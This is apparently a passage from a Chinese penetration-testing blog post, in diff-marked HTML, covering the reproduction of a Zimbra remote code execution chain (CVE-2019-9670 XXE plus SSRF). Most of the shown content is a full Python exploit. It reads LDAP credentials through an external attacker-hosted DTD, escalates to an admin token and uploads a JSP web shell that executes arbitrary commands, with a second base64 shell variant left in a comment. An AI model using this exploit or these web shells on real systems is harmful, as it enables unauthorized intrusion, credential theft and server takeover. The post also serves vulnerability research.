String(b));&#125;out.print(&quot;&lt;/pre&gt;&quot;);&#125;%&gt;&#x27;</span>,<span class="string">&quot;text/plain&quot;</span>), </span><br><span class="line"><span class="string">&#x27;requestId&#x27;</span>:(<span class="literal">None</span>,<span class="string">&quot;12&quot;</span>,<span class="literal">None</span>),</span><br><span class="line">&#125;</span><br><span class="line">headers =&#123; </span><br><span class="line"><span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;ZM_ADMIN_AUTH_TOKEN=0_eb68a2a147c98c6d0c2257d7638c4f1256493b28_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313539323733343831303035313b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3433323433373532323b&quot;</span>,<span class="comment">#改成自己的admin_token</span></span><br><span class="line"><span class="string">&quot;Host&quot;</span>:<span class="string">&quot;foo:7071&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(<span class="string">&quot;https://192.168.37.137:7071/service/extension/clientUploader/upload&quot;</span>,files=file,headers=headers,verify=<span class="literal">False</span>)    </span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></div>
-<p><img src="/imgss/a15.png"><br>虽然执行报错了，但是不影响<br>shell地址：<a target="_blank" rel="noopener" href="https://192.168.37.137:7071/downloads/sunian.jsp">https://192.168.37.137:7071/downloads/sunian.jsp</a><br><img src="/imgss/a16.png"></p>
-<h3 id="exp的编写"><a href="#exp的编写" class="headerlink" title="exp的编写"></a>exp的编写</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PY"><figure class="iseeu highlight /py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">base_url=sys.argv[<span class="number">1</span>]</span><br><span class="line">base_url=base_url.rstrip(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"><span class="comment">#利用request模块来发包和接受数据，sys模块用来传参，并删除最右侧的/斜杠</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;sunian.jsp&quot;</span></span><br><span class="line">fileContent = <span class="string">r&#x27;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);while((a=in.read(b))!=-1)&#123;out.println(new String(b));&#125;out.print(&quot;&lt;/pre&gt;&quot;);&#125;%&gt;&#x27;</span></span><br><span class="line"><span class="comment">#fileContent = r&#x27;&lt;%@page import=&quot;java.io.*&quot;%&gt;&lt;%@page import=&quot;sun.misc.BASE64Decoder&quot;%&gt;&lt;%try &#123;String cmd = request.getParameter(&quot;tom&quot;);String path=application.getRealPath(request.getRequestURI());String dir=&quot;weblogic&quot;;if(cmd.equals(&quot;NzU1Ng&quot;))&#123;out.print(&quot;[S]&quot;+dir+&quot;[E]&quot;);&#125;byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print(&quot;-&gt;|&quot;);int c;while ((c = in.read()) != -1) &#123;out.print((char)c);&#125;in.close();out.print(&quot;|&lt;-&quot;);try &#123;child.waitFor();&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125; catch (IOException e) &#123;System.err.println(e);&#125;%&gt;&#x27;</span></span><br><span class="line"><span class="comment">#可使用第11行bypass</span></span><br><span class="line">print(base_url)</span><br><span class="line"><span class="comment">#请自己在公网放置dtd文件</span></span><br><span class="line">dtd_url=<span class="string">&quot;http://VPS-IP/exp.dtd&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;file:../conf/localconfig.xml&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#x27;%start;%file;%end;&#x27;&gt;&quot;&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">xxe_data = <span class="string">r&quot;&quot;&quot;&lt;!DOCTYPE Autodiscover [</span></span><br><span class="line"><span class="string">        &lt;!ENTITY % dtd SYSTEM &quot;&#123;dtd&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">        %dtd;</span></span><br><span class="line"><span class="string">        %all;</span></span><br><span class="line"><span class="string">        ]&gt;</span></span><br><span class="line"><span class="string">&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;Request&gt;</span></span><br><span class="line"><span class="string">        &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;</span></span><br><span class="line"><span class="string">        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;</span></span><br><span class="line"><span class="string">    &lt;/Request&gt;</span></span><br><span class="line"><span class="string">&lt;/Autodiscover&gt;&quot;&quot;&quot;</span>.format(dtd=dtd_url)</span><br><span class="line"></span><br><span class="line"><span class="comment">#XXE stage</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/xml&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">&quot;[*] Get User Name/Password By XXE &quot;</span>)</span><br><span class="line">r = requests.post(base_url+<span class="string">&quot;/Autodiscover/Autodiscover.xml&quot;</span>,data=xxe_data,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">15</span>)</span><br><span class="line"><span class="comment">#print r.text</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;response schema not available&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    print(<span class="string">&quot;don&#x27;t have xxe&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#low_token Stage</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">pattern_name = re.compile(<span class="string">r&quot;&amp;lt;key name=(\&quot;|&amp;quot;)zimbra_user(\&quot;|&amp;quot;)&amp;gt;\n.*?&amp;lt;value&amp;gt;(.*?)&amp;lt;\/value&amp;gt;&quot;</span>)</span><br><span class="line">pattern_password = re.compile(<span class="string">r&quot;&amp;lt;key name=(\&quot;|&amp;quot;)zimbra_ldap_password(\&quot;|&amp;quot;)&amp;gt;\n.*?&amp;lt;value&amp;gt;(.*?)&amp;lt;\/value&amp;gt;&quot;</span>)</span><br><span class="line">username = pattern_name.findall(r.text)[<span class="number">0</span>][<span class="number">2</span>]</span><br><span class="line">password = pattern_password.findall(r.text)[<span class="number">0</span>][<span class="number">2</span>]</span><br><span class="line"><span class="comment">#print(username)</span></span><br><span class="line"><span class="comment">#print(password)</span></span><br><span class="line"></span><br><span class="line">auth_body=<span class="string">&quot;&quot;&quot;&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;</span></span><br><span class="line"><span class="string">   &lt;soap:Header&gt;</span></span><br><span class="line"><span class="string">       &lt;context xmlns=&quot;urn:zimbra&quot;&gt;</span></span><br><span class="line"><span class="string">           &lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851.RHEL5_64&quot;/&gt;</span></span><br><span class="line"><span class="string">       &lt;/context&gt;</span></span><br><span class="line"><span class="string">   &lt;/soap:Header&gt;</span></span><br><span class="line"><span class="string">   &lt;soap:Body&gt;</span></span><br><span class="line"><span class="string">     &lt;AuthRequest xmlns=&quot;&#123;xmlns&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;account by=&quot;adminName&quot;&gt;&#123;username&#125;&lt;/account&gt;</span></span><br><span class="line"><span class="string">        &lt;password&gt;&#123;password&#125;&lt;/password&gt;</span></span><br><span class="line"><span class="string">     &lt;/AuthRequest&gt;</span></span><br><span class="line"><span class="string">   &lt;/soap:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/soap:Envelope&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&quot;[*] Get Low Privilege Auth Token&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#72行路径可能为/service/soap</span></span><br><span class="line">r=requests.post(base_url+<span class="string">&quot;/service/admin/soap&quot;</span>,data=auth_body.format(xmlns=<span class="string">&quot;urn:zimbraAccount&quot;</span>,username=username,password=password),verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">pattern_auth_token=re.compile(<span class="string">r&quot;&lt;authToken&gt;(.*?)&lt;/authToken&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">low_priv_token = pattern_auth_token.findall(r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(low_priv_token)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SSRF+Get Admin_Token Stage</span></span><br><span class="line"></span><br><span class="line">headers[<span class="string">&quot;Cookie&quot;</span>]=<span class="string">&quot;ZM_ADMIN_AUTH_TOKEN=&quot;</span>+low_priv_token+<span class="string">&quot;;&quot;</span></span><br><span class="line">headers[<span class="string">&quot;Host&quot;</span>]=<span class="string">&quot;foo:7071&quot;</span></span><br><span class="line"><span class="comment">#print(&quot;[*] Get Admin  Auth Token By SSRF&quot;)</span></span><br><span class="line"><span class="comment">#r = requests.post(base_url+&quot;/service/proxy?target=https://127.0.0.1:7071/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAdmin&quot;,username=username,password=password),headers=headers,verify=False)</span></span><br><span class="line">r = requests.post(base_url+<span class="string">&quot;/service/admin/soap&quot;</span>,data=auth_body.format(xmlns=<span class="string">&quot;urn:zimbraAdmin&quot;</span>,username=username,password=password),headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#若86行无法使用请使用85行</span></span><br><span class="line"></span><br><span class="line">admin_token =pattern_auth_token.findall(r.text)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print(&quot;ADMIN_TOKEN:&quot;+admin_token)</span></span><br><span class="line"></span><br><span class="line">f = &#123;</span><br><span class="line">    <span class="string">&#x27;filename1&#x27;</span>:(<span class="literal">None</span>,<span class="string">&quot;whocare&quot;</span>,<span class="literal">None</span>),</span><br><span class="line">    <span class="string">&#x27;clientFile&#x27;</span>:(filename,fileContent,<span class="string">&quot;text/plain&quot;</span>),</span><br><span class="line">    <span class="string">&#x27;requestId&#x27;</span>:(<span class="literal">None</span>,<span class="string">&quot;12&quot;</span>,<span class="literal">None</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers =&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;ZM_ADMIN_AUTH_TOKEN=&quot;</span>+admin_token</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">&quot;[*] 木马地址&quot;</span>)</span><br><span class="line">r = requests.post(base_url+<span class="string">&quot;/service/extension/clientUploader/upload&quot;</span>,files=f,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#print(r.text)</span></span><br><span class="line">print(base_url+<span class="string">&quot;/downloads/&quot;</span>+filename)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&quot;[*] Request Result:&quot;)</span></span><br><span class="line">s = requests.session()</span><br><span class="line">r = s.get(base_url+<span class="string">&quot;/downloads/&quot;</span>+filename,verify=<span class="literal">False</span>,headers=headers)</span><br><span class="line"><span class="comment">#print(r.text)</span></span><br><span class="line">print(<span class="string">&quot;[*] 管理员cookie&quot;</span>)</span><br><span class="line">print(headers[<span class="string">&#x27;Cookie&#x27;</span>])</span><br></pre></td></tr></table></figure></div>
-<p>演示exp运行以及不使用cookie访问木马地址的情况<br><img src="/imgss/a17.png"></p>
-<p>参考链接<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/722bc70ff426">https://www.jianshu.com/p/722bc70ff426</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40709439/article/details/90136596">https://blog.csdn.net/weixin_40709439/article/details/90136596</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41732430/article/details/89054473">https://blog.csdn.net/weixin_41732430/article/details/89054473</a></p>
 
     </div>
-
-    
-    
-    
-
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2020/06/03/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" rel="prev" title="'常用端口利用总结'">
-      <i class="fa fa-chevron-left"></i> '常用端口利用总结'
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/07/04/WIFI%E5%AE%89%E5%85%A8/" rel="next" title="">
-       <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
   </div>
 
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let activeClass = CONFIG.comments.activeClass;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
+</div>
+        
   
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
   </div>
 
   <aside class="sidebar">
-    <div class="sidebar-inner">
 
-      <ul class="sidebar-nav motion-element">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
         </li>
@@ -403,61 +164,55 @@
         </li>
       </ul>
 
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8XXE-SSRF%E7%BB%84%E5%90%88%E6%8B%B3RCE%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">利用XXE+SSRF组合拳RCE复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%8C%E6%B5%8B%E8%AF%95%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8CVE-2019-9670-XXE%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.</span> <span class="nav-text">第一步，测试是否存在CVE-2019-9670 XXE漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%8C%E8%AF%BB%E5%8F%96zimbra%E7%94%A8%E6%88%B7%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="nav-number">2.2.</span> <span class="nav-text">第二步，读取zimbra用户账号密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%8C%E5%88%A9%E7%94%A8%E8%8E%B7%E5%8F%96%E5%88%B0%E7%9A%84%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96%E4%BD%8E%E6%9D%83%E9%99%90token"><span class="nav-number">2.3.</span> <span class="nav-text">第三步，利用获取到的密码获取低权限token</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%8C%E5%88%A9%E7%94%A8SSRF%E6%BC%8F%E6%B4%9E%E9%80%9A%E8%BF%87proxy%E6%8E%A5%E5%8F%A3%EF%BC%8C%E8%AE%BF%E9%97%AEadmin%E7%9A%84soap%E6%8E%A5%E5%8F%A3%E8%8E%B7%E5%8F%96%E9%AB%98%E6%9D%83%E9%99%90Token"><span class="nav-number">2.4.</span> <span class="nav-text">第四步，利用SSRF漏洞通过proxy接口，访问admin的soap接口获取高权限Token</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%8C%E5%88%A9%E7%94%A8%E9%AB%98%E6%9D%83%E9%99%90token%E4%BC%A0%E6%96%87%E4%BB%B6getshell"><span class="nav-number">2.5.</span> <span class="nav-text">第五步，利用高权限token传文件getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp%E7%9A%84%E7%BC%96%E5%86%99"><span class="nav-number">2.6.</span> <span class="nav-text">exp的编写</span></a></li></ol></li></ol></div>
-      </div>
-      <!--/noindex-->
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#huan-jing-da-jian"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#li-yong-xxe-ssrf-zu-he-quan-rce-fu-xian"><span class="nav-number">2.</span> <span class="nav-text">利用XXE+SSRF组合拳RCE复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#di-yi-bu-ce-shi-shi-fou-cun-zai-cve-2019-9670-xxe-lou-dong"><span class="nav-number">2.1.</span> <span class="nav-text">第一步，测试是否存在CVE-2019-9670 XXE漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#di-er-bu-du-qu-zimbra-yong-hu-zhang-hao-mi-ma"><span class="nav-number">2.2.</span> <span class="nav-text">第二步，读取zimbra用户账号密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#di-san-bu-li-yong-huo-qu-dao-de-mi-ma-huo-qu-di-quan-xian-token"><span class="nav-number">2.3.</span> <span class="nav-text">第三步，利用获取到的密码获取低权限token</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#di-si-bu-li-yong-ssrf-lou-dong-tong-guo-proxy-jie-kou-fang-wen-admin-de-soap-jie-kou-huo-qu-gao-quan-xian-token"><span class="nav-number">2.4.</span> <span class="nav-text">第四步，利用SSRF漏洞通过proxy接口，访问admin的soap接口获取高权限Token</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#di-wu-bu-li-yong-gao-quan-xian-token-chuan-wen-jian-getshell"><span class="nav-number">2.5.</span> <span class="nav-text">第五步，利用高权限token传文件getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-de-bian-xie"><span class="nav-number">2.6.</span> <span class="nav-text">exp的编写</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
 
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="素念"
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zer0_c|imb"
       src="/imgss/touxiang.jpg">
-  <p class="site-author-name" itemprop="name">素念</p>
+  <p class="site-author-name" itemprop="name">zer0_c|imb</p>
   <div class="site-description" itemprop="description">忘川河畔彼岸花，红如鲜血似朱砂</div>
 </div>
-<div class="site-state-wrap motion-element">
+<div class="site-state-wrap site-overview-item animated">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">78</span>
+        <a href="/archives/">
+          <span class="site-state-item-count">81</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">12</span>
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">33</span>
+          <a href="/tags/">
+        <span class="site-state-item-count">39</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
-  <div class="links-of-author motion-element">
+  <div class="links-of-author site-overview-item animated">
       <span class="links-of-author-item">
-        <a href="mailto:lingyu195@gmail.com" title="E-Mail → mailto:lingyu195@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+        <a href="mailto:lingyu195@gmail.com" title="E-Mail → mailto:lingyu195@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
       </span>
       <span class="links-of-author-item">
-        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=3504078815" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;3504078815" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
+        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=3504078815" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;3504078815" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
       </span>
   </div>
 
 
-  <div class="links-of-blogroll motion-element">
-    <div class="links-of-blogroll-title">
-      <i class="fa fa-fw fa-link"></i>
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
       友情链接
     </div>
     <ul class="links-of-blogroll-list">
-        <li class="links-of-blogroll-item">
-          <a href="http://wp.fmk.pub/" title="http:&#x2F;&#x2F;wp.fmk.pub&#x2F;" rel="noopener" target="_blank">Defender</a>
-        </li>
         <li class="links-of-blogroll-item">
           <a href="http://www.ch4ser.top/" title="http:&#x2F;&#x2F;www.ch4ser.top&#x2F;" rel="noopener" target="_blank">ch4ser</a>
         </li>
@@ -473,42 +228,231 @@
     </ul>
   </div>
 
+        </div>
       </div>
-
     </div>
   </aside>
-  <div id="sidebar-dimmer"></div>
+  <div class="sidebar-dimmer"></div>
 
 
-      </div>
-    </main>
+    </header>
 
-    <footer class="footer">
-      <div class="footer-inner">
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunian19.github.io/2020/07/04/zimbra-RCE%E5%A4%8D%E7%8E%B0%E5%88%B0exp%E7%BC%96%E5%86%99/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/imgss/touxiang.jpg">
+      <meta itemprop="name" content="zer0_c|imb">
+      <meta itemprop="description" content="忘川河畔彼岸花，红如鲜血似朱砂">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zer0_c|imb's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          'zimbra RCE环境搭建到复现再到exp编写'
+        </h1>
+
+
+        <div class="post-meta">
         
+           <i class=""></i>
+           <font color="#1fa67a"><strong>⬆置顶</strong></font>
+           <span class="post-meta-divider">|</span>
+          
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-07-04 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-04T00:00:00+08:00">2020-07-04</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-09-18 16:12:52" itemprop="dateModified" datetime="2020-09-18T16:12:52+08:00">2020-09-18</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="huan-jing-da-jian" id="环境搭建">环境搭建</h2>
+<p>首先准备个ubantu 14.04服务器，换个更新源，更新下<br>
+安装辅助包，执行以下命令来安装相应的包</p>
+<a id="more"></a>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libgmp10 libperl5.18 unzip pax sysstat sqlite3 dnsmasq wget</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/a1.png" alt=""><br>
+配置hostname和DNS服务器</p>
